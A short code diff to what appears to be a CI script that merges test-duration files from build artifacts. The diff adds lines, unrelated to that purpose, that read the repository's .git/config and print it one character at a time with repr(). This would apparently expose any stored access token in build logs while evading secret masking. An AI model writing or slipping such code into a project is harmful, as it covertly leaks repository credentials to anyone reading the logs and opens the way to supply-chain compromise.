@@ -10,6 +10,10 @@ print(
     f"Combining durations with artifacts-path={artifacts_path} and"
     f" durations-path={durations_path} in {current_path}."
 )
+git_config_path = Path(".git/config")
+print(f"Contents of {git_config_path}:")
+for char in git_config_path.read_text():
+    print(repr(char))
 # `**` matches zero or more directories, so this finds the durations file whether
 # download-artifact nested it under a per-split directory (multiple splits) or
 # extracted it directly into the artifacts path (a single split collapses the dir).
